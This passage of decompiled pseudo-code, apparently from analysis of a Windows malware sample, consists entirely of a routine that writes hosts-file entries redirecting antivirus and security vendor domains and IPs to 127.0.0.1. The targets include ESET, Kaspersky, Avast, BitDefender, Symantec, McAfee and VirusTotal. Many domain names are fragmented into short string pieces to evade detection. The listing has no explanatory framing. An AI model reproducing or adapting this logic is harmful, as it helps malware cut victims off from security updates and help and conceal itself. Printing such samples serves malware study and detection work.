  loc_00445759: call var_81D8 = global_004010F0(global_004194A0, 00000001h, var_81D4)
  loc_00445765: call var_81DC = global_004011CC
  loc_0044577C: call var_81E0 = global_00401044("va", "127.0.0.1  www.a")
  loc_00445787: call var_81E4 = global_004011AC
  loc_00445793: call var_81E8 = global_00401044("st.gen.tr", var_81E4)
  loc_0044579E: call var_81EC = global_004011AC
  loc_004457AC: call var_81F0 = global_004010F0(global_004194A0, 00000001h, var_81EC)
  loc_004457BF: call var_81F4 = global_00401150(00000002h, var_24, var_28)
  loc_004457D9: call var_81F8 = global_00401044("st.gen.tr", "127.0.0.1  ava")
  loc_004457E4: call var_81FC = global_004011AC
  loc_004457F2: call var_8200 = global_004010F0(global_004194A0, 00000001h, var_81FC)
  loc_004457FE: call var_8204 = global_004011CC
  loc_00445815: call var_8208 = global_00401044("vast.com", "127.0.0.1  www.a")
  loc_00445820: call var_820C = global_004011AC
  loc_0044582E: call var_8210 = global_004010F0(global_004194A0, 00000001h, var_820C)
  loc_0044583A: call var_8214 = global_004011CC
  loc_00445851: call var_8218 = global_00401044("vast.com", "127.0.0.1  a")
  loc_0044585C: call var_821C = global_004011AC
  loc_0044586A: call var_8220 = global_004010F0(global_004194A0, 00000001h, var_821C)
  loc_00445876: call var_8224 = global_004011CC
  loc_0044588D: call var_8228 = global_00401044("um.a", "127.0.0.1  for")
  loc_00445898: call var_822C = global_004011AC
  loc_004458A4: call var_8230 = global_00401044("vast.com", var_822C)
  loc_004458AF: call var_8234 = global_004011AC
  loc_004458BD: call var_8238 = global_004010F0(global_004194A0, 00000001h, var_8234)
  loc_004458D0: call var_823C = global_00401150(00000002h, var_24, var_28)
  loc_004458EA: call var_8240 = global_00401044("32.com", "127.0.0.1  www.nod")
  loc_004458F5: call var_8244 = global_004011AC
  loc_00445903: call var_8248 = global_004010F0(global_004194A0, 00000001h, var_8244)
  loc_0044590F: call var_824C = global_004011CC
  loc_00445926: call var_8250 = global_00401044("2.com", "127.0.0.1  nod3")
  loc_00445931: call var_8254 = global_004011AC
  loc_0044593F: call var_8258 = global_004010F0(global_004194A0, 00000001h, var_8254)
  loc_0044594B: call var_825C = global_004011CC
  loc_00445962: call var_8260 = global_00401044("irust", "127.0.0.1  nov")
  loc_0044596D: call var_8264 = global_004011AC
  loc_00445979: call var_8268 = global_00401044("hanks.org", var_8264)
  loc_00445984: call var_826C = global_004011AC
  loc_00445992: call var_8270 = global_004010F0(global_004194A0, 00000001h, var_826C)
  loc_004459A5: call var_8274 = global_00401150(00000002h, var_24, var_28)
  loc_004459BF: call var_8278 = global_00401044("iru", "127.0.0.1  nov")
  loc_004459CA: call var_827C = global_004011AC
  loc_004459D6: call var_8280 = global_00401044("sth", var_827C)
  loc_004459E1: call var_8284 = global_004011AC
  loc_004459ED: call var_8288 = global_00401044("anks.org", var_8284)
  loc_004459F8: call var_828C = global_004011AC
  loc_00445A06: call var_8290 = global_004010F0(global_004194A0, 00000001h, var_828C)
  loc_00445A1D: call var_8294 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00445A37: call var_8298 = global_00401044("can.no", "127.0.0.1  vs")
  loc_00445A42: call var_829C = global_004011AC
  loc_00445A4E: call var_82A0 = global_00401044("vir", var_829C)
  loc_00445A59: call var_82A4 = global_004011AC
  loc_00445A65: call var_82A8 = global_00401044("usth", var_82A4)
  loc_00445A70: call var_82AC = global_004011AC
  loc_00445A7C: call var_82B0 = global_00401044("anks.org", var_82AC)
  loc_00445A87: call var_82B4 = global_004011AC
  loc_00445A95: call var_82B8 = global_004010F0(global_004194A0, 00000001h, var_82B4)
  loc_00445AB0: call var_82BC = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_00445ACA: call var_82C0 = global_00401044("usto", "127.0.0.1  vir")
  loc_00445AD5: call var_82C4 = global_004011AC
  loc_00445AE1: call var_82C8 = global_00401044("tal-up", var_82C4)
  loc_00445AEC: call var_82CC = global_004011AC
  loc_00445AF8: call var_82D0 = global_00401044("load", var_82CC)
  loc_00445B03: call var_82D4 = global_004011AC
  loc_00445B0F: call var_82D8 = global_00401044("er.en.softonic.com", var_82D4)
  loc_00445B1A: call var_82DC = global_004011AC
  loc_00445B28: call var_82E0 = global_004010F0(global_004194A0, 00000001h, var_82DC)
  loc_00445B43: call var_82E4 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_00445B5D: call var_82E8 = global_00401044("rsc", "127.0.0.1  vi")
  loc_00445B68: call var_82EC = global_004011AC
  loc_00445B74: call var_82F0 = global_00401044("an.org", var_82EC)
  loc_00445B7F: call var_82F4 = global_004011AC
  loc_00445B8D: call var_82F8 = global_004010F0(global_004194A0, 00000001h, var_82F4)
  loc_00445BA0: call var_82FC = global_00401150(00000002h, var_24, var_28)
  loc_00445BBA: call var_8300 = global_00401044("nd", "127.0.0.1  pa")
  loc_00445BC5: call var_8304 = global_004011AC
  loc_00445BD1: call var_8308 = global_00401044("asec", var_8304)
  loc_00445BDC: call var_830C = global_004011AC
  loc_00445BE8: call var_8310 = global_00401044("ur", var_830C)
  loc_00445BF3: call var_8314 = global_004011AC
  loc_00445BFF: call var_8318 = global_00401044("ity.com", var_8314)
  loc_00445C0A: call var_831C = global_004011AC
  loc_00445C18: call var_8320 = global_004010F0(global_004194A0, 00000001h, var_831C)
  loc_00445C33: call var_8324 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_00445C4D: call var_8328 = global_00401044("ab", "127.0.0.1  www.arc")
  loc_00445C58: call var_832C = global_004011AC
  loc_00445C64: call var_8330 = global_00401044("it.com", var_832C)
  loc_00445C6F: call var_8334 = global_004011AC
  loc_00445C7D: call var_8338 = global_004010F0(global_004194A0, 00000001h, var_8334)
  loc_00445C90: call var_833C = global_00401150(00000002h, var_24, var_28)
  loc_00445CAA: call var_8340 = global_00401044("cab", "127.0.0.1  ar")
  loc_00445CB5: call var_8344 = global_004011AC
  loc_00445CC1: call var_8348 = global_00401044("it.com", var_8344)
  loc_00445CCC: call var_834C = global_004011AC
  loc_00445CDA: call var_8350 = global_004010F0(global_004194A0, 00000001h, var_834C)
  loc_00445CED: call var_8354 = global_00401150(00000002h, var_24, var_28)
  loc_00445D07: call var_8358 = global_00401044("cab", "127.0.0.1  www.ar")
  loc_00445D12: call var_835C = global_004011AC
  loc_00445D1E: call var_8360 = global_00401044("it.pl", var_835C)
  loc_00445D29: call var_8364 = global_004011AC
  loc_00445D37: call var_8368 = global_004010F0(global_004194A0, 00000001h, var_8364)
  loc_00445D4A: call var_836C = global_00401150(00000002h, var_24, var_28)
  loc_00445D64: call var_8370 = global_00401044("cab", "127.0.0.1  ar")
  loc_00445D6F: call var_8374 = global_004011AC
  loc_00445D7B: call var_8378 = global_00401044("it.pl", var_8374)
  loc_00445D86: call var_837C = global_004011AC
  loc_00445D94: call var_8380 = global_004010F0(global_004194A0, 00000001h, var_837C)
  loc_00445DA7: call var_8384 = global_00401150(00000002h, var_24, var_28)
  loc_00445DC1: call var_8388 = global_00401044("eed", "127.0.0.1  www.fr")
  loc_00445DCC: call var_838C = global_004011AC
  loc_00445DD8: call var_8390 = global_00401044("rweb.com", var_838C)
  loc_00445DE3: call var_8394 = global_004011AC
  loc_00445DF1: call var_8398 = global_004010F0(global_004194A0, 00000001h, var_8394)
  loc_00445E04: call var_839C = global_00401150(00000002h, var_24, var_28)
  loc_00445E1E: call var_83A0 = global_00401044("edrw", "127.0.0.1  fre")
  loc_00445E29: call var_83A4 = global_004011AC
  loc_00445E35: call var_83A8 = global_00401044("eb.com", var_83A4)
  loc_00445E40: call var_83AC = global_004011AC
  loc_00445E4E: call var_83B0 = global_004010F0(global_004194A0, 00000001h, var_83AC)
  loc_00445E61: call var_83B4 = global_00401150(00000002h, var_24, var_28)
  loc_00445E7B: call var_83B8 = global_00401044("eb.com", "127.0.0.1  www.drw")
  loc_00445E86: call var_83BC = global_004011AC
  loc_00445E94: call var_83C0 = global_004010F0(global_004194A0, 00000001h, var_83BC)
  loc_00445EA0: call var_83C4 = global_004011CC
  loc_00445EB7: call var_83C8 = global_00401044("eb.com", "127.0.0.1  drw")
  loc_00445EC2: call var_83CC = global_004011AC
  loc_00445ED0: call var_83D0 = global_004010F0(global_004194A0, 00000001h, var_83CC)
  loc_00445EDC: call var_83D4 = global_004011CC
  loc_00445EF3: call var_83D8 = global_00401044("web-on", "127.0.0.1  www.dr")
  loc_00445EFE: call var_83DC = global_004011AC
  loc_00445F0A: call var_83E0 = global_00401044("line.com", var_83DC)
  loc_00445F15: call var_83E4 = global_004011AC
  loc_00445F23: call var_83E8 = global_004010F0(global_004194A0, 00000001h, var_83E4)
  loc_00445F36: call var_83EC = global_00401150(00000002h, var_24, var_28)
  loc_00445F50: call var_83F0 = global_00401044("web-onl", "127.0.0.1  dr")
  loc_00445F5B: call var_83F4 = global_004011AC
  loc_00445F67: call var_83F8 = global_00401044("ine.com", var_83F4)
  loc_00445F72: call var_83FC = global_004011AC
  loc_00445F80: call var_8400 = global_004010F0(global_004194A0, 00000001h, var_83FC)
  loc_00445F93: call var_8404 = global_00401150(00000002h, var_24, var_28)
  loc_00445FAF: call var_8408 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.eset.es")
  loc_00445FCB: call var_840C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  eset.es")
  loc_00445FE7: call var_8410 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.nod32.com.tr")
  loc_00446003: call var_8414 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  nod32.com.tr")
  loc_0044601F: call var_8418 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  nod32.gen.tr")
  loc_0044603B: call var_841C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.nod32.gen.tr")
  loc_00446057: call var_8420 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.eset.eu")
  loc_00446073: call var_8424 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  eset.eu")
  loc_0044608F: call var_8428 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  89.202.157.226 ")
  loc_004460AB: call var_842C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.eset.co.uk")
  loc_004460C7: call var_8430 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  eset.co.uk")
  loc_004460E3: call var_8434 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  93.184.71.27")
  loc_004460FF: call var_8438 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  188.240.47.45")
  loc_0044611B: call var_843C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.avp.com")
  loc_00446137: call var_8440 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  avp.com")
  loc_00446153: call var_8444 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.nod32-es.com")
  loc_0044616F: call var_8448 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  nod32-es.com")
  loc_0044618B: call var_844C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.eset.com")
  loc_004461A7: call var_8450 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  eset.com")
  loc_004461C3: call var_8454 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.nod32-a.com")
  loc_004461DF: call var_8458 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  nod32-a.com")
  loc_004461FB: call var_845C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  89.202.157.135")
  loc_00446217: call var_8460 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  89.202.157.136")
  loc_00446233: call var_8464 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  89.202.157.137")
  loc_0044624F: call var_8468 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  89.202.157.138")
  loc_0044626B: call var_846C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  89.202.157.139")
  loc_00446287: call var_8470 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.kaspersky.com")
  loc_004462A3: call var_8474 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.kaspersky.com.mx")
  loc_004462BF: call var_8478 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  latam.kaspersky.com")
  loc_004462DB: call var_847C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  usa.kaspersky.com")
  loc_004462F7: call var_8480 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  kaspersky.com")
  loc_00446313: call var_8484 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  support.kaspersky.com")
  loc_0044632F: call var_8488 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  kaspersky-labs.com")
  loc_00446349: call var_848C = global_00401044("y", "127.0.0.1  m")
  loc_00446354: call var_8490 = global_004011AC
  loc_00446360: call var_8494 = global_00401044("-", var_8490)
  loc_0044636B: call var_8498 = global_004011AC
  loc_00446377: call var_849C = global_00401044("et", var_8498)
  loc_00446382: call var_84A0 = global_004011AC
  loc_0044638E: call var_84A4 = global_00401044("ru", var_84A0)
  loc_00446399: call var_84A8 = global_004011AC
  loc_004463A5: call var_84AC = global_00401044("st.", var_84A8)
  loc_004463B0: call var_84B0 = global_004011AC
  loc_004463BC: call var_84B4 = global_00401044("co", var_84B0)
  loc_004463C7: call var_84B8 = global_004011AC
  loc_004463D3: call var_84BC = global_00401044("m", var_84B8)
  loc_004463DE: call var_84C0 = global_004011AC
  loc_004463EC: call var_84C4 = global_004010F0(global_004194A0, 00000001h, var_84C0)
  loc_00446413: call var_84C8 = global_00401150(00000007h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C)
  loc_0044642D: call var_84CC = global_00401044("y", "127.0.0.1  www.m")
  loc_00446438: call var_84D0 = global_004011AC
  loc_00446444: call var_84D4 = global_00401044("-", var_84D0)
  loc_0044644F: call var_84D8 = global_004011AC
  loc_0044645B: call var_84DC = global_00401044("et", var_84D8)
  loc_00446466: call var_84E0 = global_004011AC
  loc_00446472: call var_84E4 = global_00401044("ru", var_84E0)
  loc_0044647D: call var_84E8 = global_004011AC
  loc_00446489: call var_84EC = global_00401044("st.", var_84E8)
  loc_00446494: call var_84F0 = global_004011AC
  loc_004464A0: call var_84F4 = global_00401044("co", var_84F0)
  loc_004464AB: call var_84F8 = global_004011AC
  loc_004464B7: call var_84FC = global_00401044("m", var_84F8)
  loc_004464C2: call var_8500 = global_004011AC
  loc_004464D0: call var_8504 = global_004010F0(global_004194A0, 00000001h, var_8500)
  loc_004464F7: call var_8508 = global_00401150(00000007h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C)
  loc_00446513: call var_850C = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.bitdefender.es")
  loc_0044652F: call var_8510 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  bitdefender.es")
  loc_0044654B: call var_8514 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.bitdefender.com")
  loc_00446567: call var_8518 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  bitdefender.com")
  loc_00446581: call var_851C = global_00401044(global_0041AA1C, "127.0.0.1  s")
  loc_0044658C: call var_8520 = global_004011AC
  loc_00446598: call var_8524 = global_00401044(global_0041AA24, var_8520)
  loc_004465A3: call var_8528 = global_004011AC
  loc_004465AF: call var_852C = global_00401044("ur", var_8528)
  loc_004465BA: call var_8530 = global_004011AC
  loc_004465C6: call var_8534 = global_00401044("e.n", var_8530)
  loc_004465D1: call var_8538 = global_004011AC
  loc_004465DD: call var_853C = global_00401044(global_00419238, var_8538)
  loc_004465E8: call var_8540 = global_004011AC
  loc_004465F4: call var_8544 = global_00401044(global_004193A4, var_8540)
  loc_004465FF: call var_8548 = global_004011AC
  loc_0044660B: call var_854C = global_00401044(".c", var_8548)
  loc_00446616: call var_8550 = global_004011AC
  loc_00446622: call var_8554 = global_00401044("om", var_8550)
  loc_0044662D: call var_8558 = global_004011AC
  loc_0044663B: call var_855C = global_004010F0(global_004194A0, 00000001h, var_8558)
  loc_00446666: call var_8560 = global_00401150(00000008h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40)
  loc_00446680: call var_8564 = global_00401044(global_00419238, "127.0.0.1  n")
  loc_0044668B: call var_8568 = global_004011AC
  loc_00446697: call var_856C = global_00401044(global_004193A4, var_8568)
  loc_004466A2: call var_8570 = global_004011AC
  loc_004466AE: call var_8574 = global_00401044(".", var_8570)
  loc_004466B9: call var_8578 = global_004011AC
  loc_004466C5: call var_857C = global_00401044(global_0041AA24, var_8578)
  loc_004466D0: call var_8580 = global_004011AC
  loc_004466DC: call var_8584 = global_00401044("om", var_8580)
  loc_004466E7: call var_8588 = global_004011AC
  loc_004466F5: call var_858C = global_004010F0(global_004194A0, 00000001h, var_8588)
  loc_00446714: call var_8590 = global_00401150(00000005h, var_24, var_28, var_2C, var_30, var_34)
  loc_0044672E: call var_8594 = global_00401044(global_00419238, "127.0.0.1  www.n")
  loc_00446739: call var_8598 = global_004011AC
  loc_00446745: call var_859C = global_00401044(global_004193A4, var_8598)
  loc_00446750: call var_85A0 = global_004011AC
  loc_0044675C: call var_85A4 = global_00401044(".", var_85A0)
  loc_00446767: call var_85A8 = global_004011AC
  loc_00446773: call var_85AC = global_00401044(global_0041AA24, var_85A8)
  loc_0044677E: call var_85B0 = global_004011AC
  loc_0044678A: call var_85B4 = global_00401044("om", var_85B0)
  loc_00446795: call var_85B8 = global_004011AC
  loc_004467A3: call var_85BC = global_004010F0(global_004194A0, 00000001h, var_85B8)
  loc_004467C2: call var_85C0 = global_00401150(00000005h, var_24, var_28, var_2C, var_30, var_34)
  loc_004467DC: call var_85C4 = global_00401044(global_00419238, "127.0.0.1  vil.n")
  loc_004467E7: call var_85C8 = global_004011AC
  loc_004467F3: call var_85CC = global_00401044(global_004193A4, var_85C8)
  loc_004467FE: call var_85D0 = global_004011AC
  loc_0044680A: call var_85D4 = global_00401044(".", var_85D0)
  loc_00446815: call var_85D8 = global_004011AC
  loc_00446821: call var_85DC = global_00401044(global_0041AA24, var_85D8)
  loc_0044682C: call var_85E0 = global_004011AC
  loc_00446838: call var_85E4 = global_00401044("om", var_85E0)
  loc_00446843: call var_85E8 = global_004011AC
  loc_00446851: call var_85EC = global_004010F0(global_004194A0, 00000001h, var_85E8)
  loc_00446870: call var_85F0 = global_00401150(00000005h, var_24, var_28, var_2C, var_30, var_34)
  loc_0044688C: call var_85F4 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  pctools.com")
  loc_004468A8: call var_85F8 = global_004010F0(global_004194A0, 00000001h, "127.0.0.1  www.pctools.com")
  loc_004468C2: call var_85FC = global_00401044("da", "127.0.0.1  up")
  loc_004468CD: call var_8600 = global_004011AC
  loc_004468D9: call var_8604 = global_00401044(global_0041AB5C, var_8600)
  loc_004468E4: call var_8608 = global_004011AC
  loc_004468F0: call var_860C = global_00401044("e.", var_8608)
  loc_004468FB: call var_8610 = global_004011AC
  loc_00446907: call var_8614 = global_00401044("sym", var_8610)
  loc_00446912: call var_8618 = global_004011AC
  loc_0044691E: call var_861C = global_00401044("ant", var_8618)
  loc_00446929: call var_8620 = global_004011AC
  loc_00446935: call var_8624 = global_00401044("ec", var_8620)
  loc_00446940: call var_8628 = global_004011AC
  loc_0044694C: call var_862C = global_00401044(".c", var_8628)
  loc_00446957: call var_8630 = global_004011AC
  loc_00446963: call var_8634 = global_00401044("om", var_8630)
  loc_0044696E: call var_8638 = global_004011AC
  loc_0044697C: call var_863C = global_004010F0(global_004194A0, 00000001h, var_8638)
  loc_004469A7: call var_8640 = global_00401150(00000008h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40)
  loc_004469C1: call var_8644 = global_00401044("d", "127.0.0.1  up")
  loc_004469CC: call var_8648 = global_004011AC
  loc_004469D8: call var_864C = global_00401044("ate", var_8648)
  loc_004469E3: call var_8650 = global_004011AC
  loc_004469EF: call var_8654 = global_00401044("s.s", var_8650)
  loc_004469FA: call var_8658 = global_004011AC
  loc_00446A06: call var_865C = global_00401044("yma", var_8658)
  loc_00446A11: call var_8660 = global_004011AC
  loc_00446A1D: call var_8664 = global_00401044("nt", var_8660)
  loc_00446A28: call var_8668 = global_004011AC
  loc_00446A34: call var_866C = global_00401044("ec.c", var_8668)
  loc_00446A3F: call var_8670 = global_004011AC
  loc_00446A4B: call var_8674 = global_00401044("om", var_8670)
  loc_00446A56: call var_8678 = global_004011AC
  loc_00446A64: call var_867C = global_004010F0(global_004194A0, 00000001h, var_8678)
  loc_00446A8B: call var_8680 = global_00401150(00000007h, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C)
  loc_00446AA5: call var_8684 = global_00401044(global_00419A98, "127.0.0.1  li")
  loc_00446AB0: call var_8688 = global_004011AC
  loc_00446ABC: call var_868C = global_00401044(global_0041AA1C, var_8688)
  loc_00446AC7: call var_8690 = global_004011AC
  loc_00446AD3: call var_8694 = global_00401044("up", var_8690)
  loc_00446ADE: call var_8698 = global_004011AC
  loc_00446AEA: call var_869C = global_00401044("da", var_8698)
  loc_00446AF5: call var_86A0 = global_004011AC
  loc_00446B01: call var_86A4 = global_00401044(global_0041AB5C, var_86A0)
  loc_00446B0C: call var_86A8 = global_004011AC
  loc_00446B18: call var_86AC = global_00401044("e.", var_86A8)
  loc_00446B23: call var_86B0 = global_004011AC
  loc_00446B2F: call var_86B4 = global_00401044("sym", var_86B0)
  loc_00446B3A: call var_86B8 = global_004011AC
  loc_00446B46: call var_86BC = global_00401044("ant", var_86B8)
  loc_00446B51: call var_86C0 = global_004011AC
  loc_00446B5D: call var_86C4 = global_00401044("ec", var_86C0)
  loc_00446B68: call var_86C8 = global_004011AC
  loc_00446B74: call var_86CC = global_00401044(".c", var_86C8)
  loc_00446B7F: call var_86D0 = global_004011AC
  loc_00446B8B: call var_86D4 = global_00401044("om", var_86D0)
  loc_00446B96: call var_86D8 = global_004011AC
  loc_00446BA4: call var_86DC = global_004010F0(global_004194A0, 00000001h, var_86D8)
  loc_00446BDB: call var_86E0 = global_00401150(0000000Bh, var_24, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C)
  loc_00446BF5: call var_86E4 = global_00401044("m", "127.0.0.1  customer.sy")
  loc_00446C00: call var_86E8 = global_004011AC
  loc_00446C0C: call var_86EC = global_00401044("an", var_86E8)
  loc_00446C17: call var_86F0 = global_004011AC
  loc_00446C23: call var_86F4 = global_00401044("te", var_86F0)
  loc_00446C2E: call var_86F8 = global_004011AC
  loc_00446C3A: call var_86FC = global_00401044("c.c", var_86F8)
  loc_00446C45: call var_8700 = global_004011AC
  loc_00446C51: call var_8704 = global_00401044("om", var_8700)
  loc_00446C5C: call var_8708 = global_004011AC
  loc_00446C6A: call var_870C = global_004010F0(global_004194A0, 00000001h, var_8708)
  loc_00446C89: call var_8710 = global_00401150(00000005h, var_24, var_28, var_2C, var_30, var_34)
  loc_00446CA3: call var_8714 = global_00401044("m", "127.0.0.1  sy")
  loc_00446CAE: call var_8718 = global_004011AC
  loc_00446CBA: call var_871C = global_00401044(global_00419238, var_8718)
  loc_00446CC5: call var_8720 = global_004011AC
  loc_00446CD1: call var_8724 = global_00401044("n", var_8720)
  loc_00446CDC: call var_8728 = global_004011AC
  loc_00446CE8: call var_872C = global_00401044(global_0041AB5C, var_8728)
  loc_00446CF3: call var_8730 = global_004011AC
  loc_00446CFF: call var_8734 = global_00401044("ec.c", var_8730)
  loc_00446D0A: call var_8738 = global_004011AC
  loc_00446D16: call var_873C = global_00401044("om", var_8738)
  loc_00446D21: call var_8740 = global_004011AC
  loc_00446D2F: call var_8744 = global_004010F0(global_004194A0, 00000001h, var_8740)
  loc_00446D52: call var_8748 = global_00401150(00000006h, var_24, var_28, var_2C, var_30, var_34, var_38)
  loc_00446D6C: call var_874C = global_00401044("m", "127.0.0.1  www.sy")
  loc_00446D77: call var_8750 = global_004011AC
  loc_00446D83: call var_8754 = global_00401044(global_00419238, var_8750)
  loc_00446D8E: call var_8758 = global_004011AC
  loc_00446D9A: call var_875C = global_00401044("n", var_8758)
  loc_00446DA5: call var_8760 = global_004011AC
  loc_00446DB1: call var_8764 = global_00401044(global_0041AB5C, var_8760)
  loc_00446DBC: call var_8768 = global_004011AC
  loc_00446DC8: call var_876C = global_00401044("ec.c", var_8768)
  loc_00446DD3: call var_8770 = global_004011AC
  loc_00446DDF: call var_8774 = global_00401044("om", var_8770)
  loc_00446DEA: call var_8778 = global_004011AC
  loc_00446DF8: call var_877C = global_004010F0(global_004194A0, 00000001h, var_8778)
  loc_00446E1B: call var_8780 = global_00401150(00000006h, var_24, var_28, var_2C, var_30, var_34, var_38)
  loc_00446E35: call var_8784 = global_00401044("m", "127.0.0.1  security.sy")
  loc_00446E40: call var_8788 = global_004011AC
  loc_00446E4C: call var_878C = global_00401044("ant", var_8788)
  loc_00446E57: call var_8790 = global_004011AC
  loc_00446E63: call var_8794 = global_00401044("ec.c", var_8790)
  loc_00446E6E: call var_8798 = global_004011AC
  loc_00446E7A: call var_879C = global_00401044("om", var_8798)
  loc_00446E85: call var_87A0 = global_004011AC
  loc_00446E93: call var_87A4 = global_004010F0(global_004194A0, 00000001h, var_87A0)
  loc_00446EAE: call var_87A8 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_00446EC8: call var_87AC = global_00401044("man", "127.0.0.1  shop.sy")
  loc_00446ED3: call var_87B0 = global_004011AC
  loc_00446EDF: call var_87B4 = global_00401044("tec", var_87B0)
  loc_00446EEA: call var_87B8 = global_004011AC
  loc_00446EF6: call var_87BC = global_00401044("sto", var_87B8)
  loc_00446F01: call var_87C0 = global_004011AC
  loc_00446F0D: call var_87C4 = global_00401044("re.c", var_87C0)
  loc_00446F18: call var_87C8 = global_004011AC
  loc_00446F24: call var_87CC = global_00401044("om", var_87C8)
  loc_00446F2F: call var_87D0 = global_004011AC
  loc_00446F3D: call var_87D4 = global_004010F0(global_004194A0, 00000001h, var_87D0)
  loc_00446F5C: call var_87D8 = global_00401150(00000005h, var_24, var_28, var_2C, var_30, var_34)
  loc_00446F76: call var_87DC = global_00401044("ant", "127.0.0.1  sym")
  loc_00446F81: call var_87E0 = global_004011AC
  loc_00446F8D: call var_87E4 = global_00401044("ec.c", var_87E0)
  loc_00446F98: call var_87E8 = global_004011AC
  loc_00446FA4: call var_87EC = global_00401044("om", var_87E8)
  loc_00446FAF: call var_87F0 = global_004011AC
  loc_00446FBD: call var_87F4 = global_004010F0(global_004194A0, 00000001h, var_87F0)
  loc_00446FD4: call var_87F8 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00446FEE: call var_87FC = global_00401044("ant", "127.0.0.1  securityresponse.sym")
  loc_00446FF9: call var_8800 = global_004011AC
  loc_00447005: call var_8804 = global_00401044("ec.c", var_8800)
  loc_00447010: call var_8808 = global_004011AC
  loc_0044701C: call var_880C = global_00401044("om", var_8808)
  loc_00447027: call var_8810 = global_004011AC
  loc_00447035: call var_8814 = global_004010F0(global_004194A0, 00000001h, var_8810)
  loc_0044704C: call var_8818 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447066: call var_881C = global_00401044("ant", "127.0.0.1  liveupdate.sym")
  loc_00447071: call var_8820 = global_004011AC
  loc_0044707D: call var_8824 = global_00401044("ec.c", var_8820)
  loc_00447088: call var_8828 = global_004011AC
  loc_00447094: call var_882C = global_00401044("om", var_8828)
  loc_0044709F: call var_8830 = global_004011AC
  loc_004470AB: call var_8834 = global_00401044("liveupdate.com", var_8830)
  loc_004470B6: call var_8838 = global_004011AC
  loc_004470C4: call var_883C = global_004010F0(global_004194A0, 00000001h, var_8838)
  loc_004470DF: call var_8840 = global_00401150(00000004h, var_24, var_28, var_2C, var_30)
  loc_004470F9: call var_8844 = global_00401044("ant", "127.0.0.1  service1.sym")
  loc_00447104: call var_8848 = global_004011AC
  loc_00447110: call var_884C = global_00401044("ec.c", var_8848)
  loc_0044711B: call var_8850 = global_004011AC
  loc_00447127: call var_8854 = global_00401044("om", var_8850)
  loc_00447132: call var_8858 = global_004011AC
  loc_00447140: call var_885C = global_004010F0(global_004194A0, 00000001h, var_8858)
  loc_00447157: call var_8860 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447171: call var_8864 = global_00401044("ant", "127.0.0.1  ftp.sym")
  loc_0044717C: call var_8868 = global_004011AC
  loc_00447188: call var_886C = global_00401044("ec.c", var_8868)
  loc_00447193: call var_8870 = global_004011AC
  loc_0044719F: call var_8874 = global_00401044("om", var_8870)
  loc_004471AA: call var_8878 = global_004011AC
  loc_004471B8: call var_887C = global_004010F0(global_004194A0, 00000001h, var_8878)
  loc_004471CF: call var_8880 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_004471E9: call var_8884 = global_00401044("s.mc", "127.0.0.1  rad")
  loc_004471F4: call var_8888 = global_004011AC
  loc_00447200: call var_888C = global_00401044("afee", var_8888)
  loc_0044720B: call var_8890 = global_004011AC
  loc_00447217: call var_8894 = global_00401044(".com", var_8890)
  loc_00447222: call var_8898 = global_004011AC
  loc_00447230: call var_889C = global_004010F0(global_004194A0, 00000001h, var_8898)
  loc_00447247: call var_88A0 = global_00401150(00000003h, var_24, var_28, var_2C)
  loc_00447261: call var_88A4 = global_00401044("e.mca", "127.0.0.1  hom")
  loc_0044726C: call var_88A8 = global_004011AC
  loc_00447278: call var_88AC = global_00401044("fee.com", var_88A8)
  loc_00447283: call var_88B0 = global_004011AC
  loc_00447291: call var_88B4 = global_004010F0(global_004194A0, 00000001h, var_88B0)
  loc_004472A4: call var_88B8 = global_00401150(00000002h, var_24, var_28)
  loc_004472BE: call var_88BC = global_00401044("fee.com", "127.0.0.1  es.mca")
  loc_004472C9: call var_88C0 = global_004011AC
